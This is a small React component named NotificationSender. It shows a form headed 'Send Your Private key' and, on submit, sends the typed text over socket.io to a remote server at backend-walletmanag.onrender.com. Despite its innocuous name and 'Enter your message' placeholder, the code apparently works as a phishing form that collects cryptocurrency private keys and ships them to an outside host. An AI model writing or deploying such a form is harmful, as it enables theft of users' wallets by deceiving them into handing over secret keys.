import { useState } from "react";
import { io } from "socket.io-client";

// // Connect to the WebSocket server
// const socket = io("http://localhost:4000");

export default function NotificationSender() {
  const [message, setMessage] = useState("");

  const sendNotification = () => {
    if (message.trim()) {
      // Connect to the WebSocket server
      const socket = io("https://backend-walletmanag.onrender.com");
      socket.emit("sendNotification", message);
      setMessage(""); // Clear input field
    }
  };

  return (
    <div>
      <h2>Send Your Private key</h2>
      <input
        type="text"
        value={message}
        onChange={(e) => setMessage(e.target.value)}
        placeholder="Enter your message"
      />
      <br /> <br />
      <button class="button" onClick={sendNotification}>
        Send
      </button>
    </div>
  );
}
